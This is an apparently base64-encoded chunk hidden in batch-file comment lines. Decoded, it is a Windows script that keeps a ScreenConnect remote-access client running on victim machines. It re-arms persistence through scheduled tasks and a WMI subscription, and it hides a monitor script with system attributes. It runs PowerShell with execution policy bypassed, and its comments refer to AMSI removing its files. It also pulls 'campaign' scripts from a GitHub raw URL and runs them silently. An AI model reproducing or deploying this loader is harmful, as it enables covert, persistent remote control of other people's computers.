::DQogICAgICBpZiAhX1BOISBHVFIgIUxJQl9GTE9PUiEgc2V0ICJMSUJfRkxPT1I9
::IV9QTiEiDQogICAgKQ0KICApDQogIHNldCAiU0VMRl9VUEQ9MCINCiAgaWYgZXhp
::c3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAoDQogICAgZmMgL2IgIiVTVEFHRSVc
::b3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQogICAg
::aWYgZXJyb3JsZXZlbCAxIHNldCAiU0VMRl9VUEQ9MSINCiAgICBpZiAiIVNFTEZf
::VVBEISI9PSIwIiBkZWwgL2YgL3EgIiVTVEFHRSVcb3duX21vbi5uZXh0IiA+bnVs
::IDI+JjENCiAgKQ0KKSBlbHNlIGlmIC9JICIhVVBEX09LISI9PSJmYWxsYmFjayIg
::KA0KICBmaW5kc3RyIC9DOiJUR19SRVBPUlQgQlVJTEQiICIlU1RBR0UlXHRnX3Jl
::cG9ydC5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVNUQUdFJVx0Z19y
::ZXBvcnQubmV3IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVNUQUdF
::JVx0Z19yZXBvcnQubmV3IiAiJVdEJVx0Z19yZXBvcnQucHMxIiA+bnVsIDI+JjEN
::CiAgZmluZHN0ciAvQzoiT1dOX1NFQ1VSRSBCVUlMRCIgIiVTVEFHRSVcb3duX3Nl
::Y3VyZS5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVNUQUdFJVxvd25f
::c2VjdXJlLm5ldyIpIGRvIGlmICUlfnpGIEdUUiA4MDAgbW92ZSAveSAiJVNUQUdF
::JVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4m
::MQ0KICBpZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgKA0KICAgIGZpbmRz
::dHIgL0M6Ik9XTl9MSUIgIEJVSUxEIiAiJVNUQUdFJVxvd25fbGliLm5ldyIgPm51
::bCAyPiYxDQogICAgaWYgbm90IGVycm9ybGV2ZWwgMSBmb3IgJSVGIGluICgiJVNU
::QUdFJVxvd25fbGliLm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAwICgNCiAgICAg
::IGNhbGwgOlJlZnVzZUlmTGliQmVsb3dGbG9vciAiJVNUQUdFJVxvd25fbGliLm5l
::dyINCiAgICAgIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgICAgIGVjaG8gbGliX2Rv
::d25ncmFkZV9ibG9ja2VkIGZsb29yPSFMSUJfRkxPT1IhPj4iJUxPRyUiDQogICAg
::ICAgIGRlbCAvZiAvcSAiJVNUQUdFJVxvd25fbGliLm5ldyIgPm51bCAyPiYxDQog
::ICAgICApIGVsc2UgKA0KICAgICAgICBtb3ZlIC95ICIlU1RBR0UlXG93bl9saWIu
::bmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQogICAgICAgIGNhbGwg
::OlBhcnNlTGliTnVtICIlV0QlXG93bl9saWIucHMxIg0KICAgICAgICBpZiAhX1BO
::ISBHVFIgIUxJQl9GTE9PUiEgc2V0ICJMSUJfRkxPT1I9IV9QTiEiDQogICAgICAp
::DQogICAgKQ0KICApDQogIHNldCAiU0VMRl9VUEQ9MCINCiAgZmluZHN0ciAvQzoi
::T1dOX01PTiAgQlVJTEQiICIlU1RBR0UlXG93bl9tb24ubmV4dCIgPm51bCAyPiYx
::DQogIGlmIG5vdCBlcnJvcmxldmVsIDEgZm9yICUlRiBpbiAoIiVTVEFHRSVcb3du
::X21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgKA0KICAgIGZjIC9iICIl
::U1RBR0UlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4m
::MQ0KICAgIGlmIGVycm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiDQogICkNCiAg
::aWYgIiVTRUxGX1VQRCUiPT0iMCIgZGVsIC9mIC9xICIlU1RBR0UlXG93bl9tb24u
::bmV4dCIgPm51bCAyPiYxDQopIGVsc2UgKA0KICBkZWwgL2YgL3EgIiVTVEFHRSVc
::dGdfcmVwb3J0Lm5ldyIgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIlU1RBR0Ul
::XG93bl9saWIubmV3IiAiJVNUQUdFJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0K
::ICBzZXQgIlNFTEZfVVBEPTAiDQopDQpjYWxsIDpTYXZlRmxvb3INCg0KcmVtIE01
::ODogbnVtZXJpYyBzdGlja3kgZmxvb3Ig4oCUIHJlZnVzZSBhbnkgc3RhZ2VkIG1v
::biBiZWxvdyBNT05fRkxPT1IgKENETi9zdGFsZSBjYW5ub3Qgcm9sbCBiYWNrKQ0K
::aWYgIiFTRUxGX1VQRCEiPT0iMSIgaWYgZXhpc3QgIiVTVEFHRSVcb3duX21vbi5u
::ZXh0IiAoDQogIGNhbGwgOlJlZnVzZUlmTW9uQmVsb3dGbG9vciAiJVNUQUdFJVxv
::d25fbW9uLm5leHQiDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBtb25f
::ZG93bmdyYWRlX2Jsb2NrZWQgZmxvb3I9IU1PTl9GTE9PUiE+PiIlTE9HJSINCiAg
::ICBkZWwgL2YgL3EgIiVTVEFHRSVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCiAg
::ICBzZXQgIlNFTEZfVVBEPTAiDQogICkNCikNCg0KZGVsIC9mIC9xICIlU1RBR0Ul
::XHRnX3JlcG9ydC5uZXciICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJVNUQUdF
::JVxvd25fbGliLm5ldyIgPm51bCAyPiYxDQpkZWwgL2YgL3EgIiVTVEFHRSVcdXBk
::YXRlLm1hbmlmZXN0IiAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3Quc2lnIiA+bnVs
::IDI+JjENCg0KcmVtIE00MzogaWYgbGliIHN0aWxsIG1pc3NpbmcgKEFNU0kgd2lw
::ZWQgaXQgLyBuZXZlciBsYW5kZWQpLCBrZWVwIGEgVEVNUCBjb3B5IGZvciBmYWxs
::YmFja3MNCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgaWYgZXhpc3Qg
::IiVTVEFHRSVcb3duX2xpYi5uZXciICgNCiAgY2FsbCA6UmVmdXNlSWZMaWJCZWxv
::d0Zsb29yICIlU1RBR0UlXG93bl9saWIubmV3Ig0KICBpZiBub3QgZXJyb3JsZXZl
::bCAxIGNvcHkgL3kgIiVTVEFHRSVcb3duX2xpYi5uZXciICIlV0QlXG93bl9saWIu
::cHMxIiA+bnVsIDI+JjENCikNCg0KcmVtIE00Mjogc2V2cnouY2ZnIGR5bmFtaWMg
::RlAgZnJvbSByZXBvIHNldnJ6X2V4cGVjdGVkLmNmZw0KaWYgZXhpc3QgIiVXRCVc
::c2V2cnouY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0i
::ICUlSyBpbiAoIiVXRCVcc2V2cnouY2ZnIikgZG8gKA0KICBpZiAvSSAiJSVLIj09
::IlBSSU1BUllfRlAiIHNldCAiS0VFUF9GUD0lJUwiDQogIGlmIC9JICIlJUsiPT0i
::QUxUX0ZQIiBzZXQgIkFMVF9GUD0lJUwiDQopDQoiJUNVUkwlIiAtTCAtLXNzbC1u
::by1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIl
::U1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5ldyIgIiVTRVZSWl9FWFBfVVJMJSIgPm51
::bCAyPiYxDQppZiBub3QgZXhpc3QgIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3
::IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRpbWUgMjAg
::LW8gIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiAiJVNFVlJaX0VYUF9VUkwy
::JSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVNUQUdFJVxzZXZyel9leHBlY3RlZC5u
::ZXciIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNl
::YmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAi
::JHQ9R2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclU1RBR0UlXHNldnJ6X2V4cGVj
::dGVkLm5ldycgLVJhdzsgJiAnJVdEJVxvd25fbGliLnBzMScgLUFjdGlvbiBzeW5j
::LXNldnJ6LWZwIC1Xb3JrRGlyICclV0QlJyAtRXh0cmEgJHQiYCkgZG8gKA0KICAg
::IGVjaG8gc2V2cnpfc3luYyAlJVI+PiIlTE9HJSINCiAgICBmb3IgL2YgInRva2Vu
::cz0yLDMgZGVsaW1zPXwiICUlQSBpbiAoIiUlUiIpIGRvICgNCiAgICAgIGlmIG5v
::dCAiJSVBIj09IiIgc2V0ICJLRUVQX0ZQPSUlQSINCiAgICAgIGlmIG5vdCAiJSVC
::Ij09IiIgc2V0ICJBTFRfRlA9JSVCIg0KICAgICkNCiAgKQ0KKQ0KZGVsIC9mIC9x
::ICIlU1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5ldyIgPm51bCAyPiYxDQppZiBleGlz
::dCAiJVdEJVxzZXZyei5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBk
::ZWxpbXM9PSIgJSVLIGluICgiJVdEJVxzZXZyei5jZmciKSBkbyAoDQogIGlmIC9J
::ICIlJUsiPT0iUFJJTUFSWV9GUCIgc2V0ICJLRUVQX0ZQPSUlTCINCiAgaWYgL0kg
::IiUlSyI9PSJBTFRfRlAiIHNldCAiQUxUX0ZQPSUlTCINCikNCg0KcmVtIOKUgOKU
::gCBbQl0gcmUtYXJtIGNoYWluIDE6IG93bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0
::ZW5jZS1vbmx5KSDilIDilIANCnJlbSBMMTEvTTIyOiBRdWVyeS1vbmx5IHNraXBw
::ZWQgcmVhcm0gd2hlbiBXaW5kb3dzIGJ1aWx0LWluIHRhc2tzIHNoYXJlZA0KcmVt
::IGRlZmF1bHQgbmFtZXMgKERpYWdub3Npc1xTY2hlZHVsZWQgZXRjLikgLT4gbW9u
::IG5ldmVyIHJhbiwgbm8gbG9nLg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEi
::ICgNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNo
::ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
::QnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHRhc2tzLWVu
::c3VyZSAtV29ya0RpciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQi
::YCkgZG8gKA0KICAgIGVjaG8gdGFza3NfZW5zdXJlICUlUj4+IiVMT0clIg0KICAg
::IHNldCAiVEFTS1NfRU5TVVJFPSUlUiINCiAgKQ0KKQ0KaWYgbm90IGV4aXN0ICIl
::RVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93
::bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5j
::bWQiID5udWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVU
::TCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KDQpyZW0g4pSA4pSAIFtCMl0g
::cmUtYXJtIGNoYWluIDIgKFdNSSBzdWJzY3JpcHRpb24pIGlmIG1pc3Npbmcg4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGli
::LnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBv
::d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
::bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gd2F0
::Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxvd25f
::bW9uLmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiINCiAgaWYgL0kgIiFXRF9T
::VEFURSEiPT0iUkVBUk1FRCIgZWNobyB3YXRjaGRvZyBXTUkgUkVBUk1FRD4+IiVM
::T0clIg0KKQ0KDQpyZW0g4pSA4pSAIFtBNF0gTTcxOiBmbGVldCBvbmUtc2hvdCBj
::YW1wYWlnbiAodG9rZW4rc2NyaXB0IGZyb20gbWFpbiwgcGVyLWhvc3QgYWNrLCBu
::ZXZlciByZXBlYXRzKSDilIDilIANCnNldCAiQ0FNUF9DRkc9JVNUQUdFJVxmbGVl
::dF9jYW1wYWlnbi5uZXciDQpzZXQgIkNBTVBBSUdOPSINCnNldCAiQ0FNUFNDUklQ
::VD0iDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVv
::dXQgNiAtLW1heC10aW1lIDE1IC1vICIlQ0FNUF9DRkclIiAiaHR0cHM6Ly9yYXcu
::Z2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4v
::ZmxlZXRfY2FtcGFpZ24uY2ZnP3Q9JVJBTkRPTSUlUkFORE9NJSIgPm51bCAyPiYx
::DQppZiBleGlzdCAiJUNBTVBfQ0ZHJSIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9
::MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlQ0FNUF9DRkclIikgZG8gKA0KICBpZiAv
::SSAiJSVLIj09IkNBTVBBSUdOIiBzZXQgIkNBTVBBSUdOPSUlTCINCiAgaWYgL0kg
::IiUlSyI9PSJTQ1JJUFQiIHNldCAiQ0FNUFNDUklQVD0lJUwiDQopDQppZiBkZWZp
::bmVkIENBTVBBSUdOIGlmIGRlZmluZWQgQ0FNUFNDUklQVCBpZiBub3QgZXhpc3Qg
::IiVXRCVcY2FtcGFpZ25fIUNBTVBBSUdOIS5hY2siICgNCiAgZWNobyBjYW1wYWln
::biAhQ0FNUEFJR04hIHNjcmlwdD0hQ0FNUFNDUklQVCEgZmV0Y2g+PiIlTE9HJSIN
::CiAgIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0
::IDggLS1tYXgtdGltZSAzMCAtbyAiJVNUQUdFJVxjYW1wXyFDQU1QU0NSSVBUISIg
::Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRo
::dWItZHJvcC9tYWluLyFDQU1QU0NSSVBUIT90PSVSQU5ET00lJVJBTkRPTSUiID5u
::dWwgMj4mMQ0KICBpZiBleGlzdCAiJVNUQUdFJVxjYW1wXyFDQU1QU0NSSVBUISIg
::KA0KICAgIGZpbmRzdHIgL0M6IkNBTVBBSUdOX1NDUklQVCIgIiVTVEFHRSVcY2Ft
::cF8hQ0FNUFNDUklQVCEiID5udWwgMj4mMQ0KICAgIGlmIG5vdCBlcnJvcmxldmVs
::IDEgZm9yICUlRiBpbiAoIiVTVEFHRSVcY2FtcF8hQ0FNUFNDUklQVCEiKSBkbyBp
::ZiAlJX56RiBHVFIgNDAwICgNCiAgICAgIGVjaG8gJURBVEUlICVUSU1FJSBxdWV1
::ZWQ+IiVXRCVcY2FtcGFpZ25fIUNBTVBBSUdOIS5hY2siDQogICAgICBzdGFydCAi
::IiAvbWluIGNtZC5leGUgL2MgIiVTVEFHRSVcY2FtcF8hQ0FNUFNDUklQVCEiDQog
::ICAgICBlY2hvIGNhbXBhaWduICFDQU1QQUlHTiEgbGF1bmNoZWQ+PiIlTE9HJSIN
::CiAgICApDQogICkNCikNCmRlbCAvZiAvcSAiJUNBTVBfQ0ZHJSIgPm51bCAyPiYx
::DQoNCnJlbSDilIDilIAgW0VdIEw0NS9NNDggSEFORFMtT0ZGOiBza2lwIGV4dGVy
::bWluYXRlIChkbyBub3QgdG91Y2ggYW55IFNjcmVlbkNvbm5lY3QpIOKUgOKUgA0K
::ZWNobyBoYW5kc19vZmZfc2tpcF9leHRlcm1pbmF0ZT4+IiVMT0clIg0Kc2V0ICJG
::T1JFSUdOX0xFRlQ9MCINCmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEg
::aW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNF
::X05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgc2V0ICJGUD0l
::JWEiDQogIHNldCAiRlA9IUZQOiA9ISINCiAgc2V0ICJGUklFTkRMWT0wIg0KICBp
::ZiAvSSAiIUZQISI9PSIlS0VFUF9GUCUiIHNldCAiRlJJRU5ETFk9MSINCiAgaWYg
::L0kgIiFGUCEiPT0iJUFMVF9GUCUiIHNldCAiRlJJRU5ETFk9MSINCiAgaWYgIiFG
::UklFTkRMWSEiPT0iMCIgKA0KICAgIHNldCAvYSBDT1VOVCs9MQ0KICAgIHNldCAv
::YSBGT1JFSUdOX0xFRlQrPTENCiAgICBzZXQgIkZPUkVJR05fTElTVD0hRk9SRUlH
::Tl9MSVNUISFGUCEgIg0KICAgIGVjaG8gZm9yZWlnbl9sZWZ0XyFGUCE+PiIlTE9H
::JSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtDXSBoZWFsIFNjcmVlbkNvbm5lY3Qg
::cHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpm
::b3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIF58IGZpbmRzdHIgL0M6
::IlNFUlZJQ0VfTkFNRSInKSBkbyAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNl
::dCAiUFJJTVNUQVRFPSUlYiINCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENs
::aWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3Qg
::ZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJQUklNX09LPTEiDQogIHNldCAvYSBDT1VO
::VCs9MQ0KKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQ
::JSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgL2EgQ09VTlQr
::PTENCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8
::IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJB
::TFRfT0s9MSINCg0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUi
::PT0iMCIgKA0KICBlY2hvIHN2YyBoZWFsIHJlc3RhcnQ+PiIlTE9HJSINCiAgbmV0
::IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAy
::PiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
::KSIgPm51bCAyPiYxDQogIHRpbWVvdXQgL3QgNiAvbm9icmVhayA+bnVsDQogIHNj
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
::ICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklN
::X09LPTEiDQopDQpyZW0gTTE2OiBzdGlsbCBzdG9wcGVkIC0+IHJlcGFpciB0aGUg
::UkVHSVNURVJFRCBwcm9kdWN0IChtc2lleGVjIC9mYSByZXN0b3Jlcw0KcmVtIGJp
::bmFyaWVzICsgc3RhcnRzIHRoZSBzZXJ2aWNlOyBMNSBSZXBhaXItU0NTZXJ2aWNl
::IGhhbmRsZXMgc3RvcHBlZCBzdmNzKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlm
::ICIlUFJJTV9PSyUiPT0iMCIgKA0KICBlY2hvIHN2YyBlc2NhbGF0ZSByZXBhaXI+
::PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hl
::bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
::eXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1G
::cCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAg
::dGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwN
::CiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIlBSSU1fT0s9MSINCikNCnJlbSBN
::MTY6IG9ycGhhbmVkIHNlcnZpY2UgZW50cnkgKHByb2R1Y3QgdW5yZWdpc3RlcmVk
::IC0gZWF0ZW4gYnkgYW4gU0MtZmFtaWx5DQpyZW0gdXBncmFkZSByZW1vdmFsKSBj
::YW4gTkVWRVIgc3RhcnQuIERlbGV0ZSBpdCBhbmQgZmFsbCB0aHJvdWdoIHRvIHRo
::ZQ0KcmVtIGZyZXNoLWluc3RhbGwgbGFkZGVyIGJlbG93IGluc3RlYWQgb2YgYWxl
::cnRpbmcgIndvbnQgc3RhcnQiIGZvcmV2ZXIuDQppZiAiJUlOU1RBTExFRCUiPT0i
::MSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIHNldCAiUkVHU1RBVEU9dW5rbm93
::biINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAiZGVsaW1z
::PSIgJSVSIGluICgncG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
::MSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAi
::JVdEJSInKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiINCiAgZWNobyBvcnBoYW5fY2hl
::Y2s9IVJFR1NUQVRFIT4+IiVMT0clIg0KICBpZiAvSSAiIVJFR1NUQVRFISI9PSJu
::byIgKA0KICAgIGVjaG8gb3JwaGFuX3NlcnZpY2VfZGVsZXRlX1NLSVBQRURfaGFu
::ZHNfb2ZmPj4iJUxPRyUiDQogICAgcmVtIE00ODogbmV2ZXIgc2MgZGVsZXRlIGFu
::eSBTY3JlZW5Db25uZWN0DQoNCiAgKQ0KKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEi
::IGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
::V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAt
::QnVpbGQgJU1PTlZFUiUgLUV4dHJhICJzdmMtd29udC1zdGFydCIgPm51bCAyPiYx
::DQogIGNhbGwgOlRnU3RhdGUgRE9XTiAiU2NyZWVuQ29ubmVjdCAoJUtFRVBfRlAl
::KSBpbnN0YWxsZWQgYnV0IHdvbnQgc3RhcnQiDQogIGdvdG8gOkFmdGVySGVhbA0K
::KQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGdvdG8gOkFmdGVySGVhbA0KDQpyZW0g
::4pSA4pSAIFtEXSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBoZWFsIGxhZGRlciDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIANCnJlbSBNMTI6IEZJUlNUIHJlcGFpciB0aGUgcmVnaXN0
::ZXJlZCBwcm9kdWN0IChyZWNyZWF0ZXMgc2VydmljZSB3aXRob3V0DQpyZW0gdG91
::Y2hpbmcgdGhlIEFMVCBpbnN0YW5jZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFsbCBv
::bmx5IGFzIGZhbGxiYWNrLg0KZWNobyBzdmMgbWlzc2luZyAtIGhlYWwgYmVnaW4+
::PiIlTE9HJSINCmNhbGwgOlJlcGFpclJlZ2lzdGVyZWQgIiVLRUVQX0ZQJSINCnNj
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
::ICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJ
::TlNUQUxMRUQ9MSINCiAgc2V0ICJQUklNX09LPTEiDQogIGdvdG8gOkFmdGVySGVh
::bA0KKQ0KcmVtIHJlZnVzZSBmcmVzaCAvaSBpZiBwcm9kdWN0IHN0aWxsIHJlZ2lz
::dGVyZWQgLSBVcGdyYWRlIHRhYmxlIGNhbiB3aXBlIEFMVCBzaWJsaW5nDQpzZXQg
::IlJFR1NUQVRFPXVua25vd24iDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIg
::Zm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1O
::b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNz
::IC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlZ2lzdGVyZWQgLUZw
::ICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAiUkVHU1RBVEU9
::JSVSIg0KaWYgL0kgIiFSRUdTVEFURSEiPT0ieWVzIiAoDQogIGVjaG8gcHJpbWFy
::eV9yZWdpc3RlcmVkX3NraXBfZnJlc2hfaW5zdGFsbD4+IiVMT0clIg0KICBwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
::Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRl
::IC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZWdpc3Rl
::cmVkLXN0dWNrIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJQcmlt
::YXJ5IHJlZ2lzdGVyZWQgYnV0IHNlcnZpY2UgbWlzc2luZyAtIC9mYSBmYWlsZWQ7
::IHJlZnVzZWQgL2kgdG8gcHJvdGVjdCBBTFQiDQogIGdvdG8gOkFmdGVySGVhbA0K
::KQ0KZWNobyBwcmltYXJ5IG1pc3NpbmcgLSBtc2kgaW5zdGFsbCBsYWRkZXI+PiIl
::TE9HJSINCmNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMSUiIGdpdGh1Yi1wa2cN
::CmlmIGVycm9ybGV2ZWwgMSBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzIlIiBq
::c2RlbGl2ci1wa2cNCmlmIGVycm9ybGV2ZWwgMSBjYWxsIDpJbnN0YWxsTXNpICIl
::TVNJX1VSTCUiIHNldnJ6LXVpDQpjYWxsIDpSZXN0b3JlQWx0DQppZiAiJUlOU1RB
::TExFRCUiPT0iMCIgKA0KICBpZiBleGlzdCAiJVdEJVxtc2lfaGVhbC5sb2ciICgN
::CiAgICBlY2hvIC0tLSBtc2lfaGVhbC5sb2cgdGFpbCAtLS0+PiIlTE9HJSINCiAg
::ICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5k
::ICJHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcbXNpX2hlYWwubG9nJyAt
::VGFpbCAxMCIgPj4iJUxPRyUiIDI+JjENCiAgKQ0KICBpZiBub3QgZGVmaW5lZCBN
::U0lFWElUIHNldCAiTVNJRVhJVD1mZXRjaC1mYWlsIg0KICBwb3dlcnNoZWxsIC1O
::b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNz
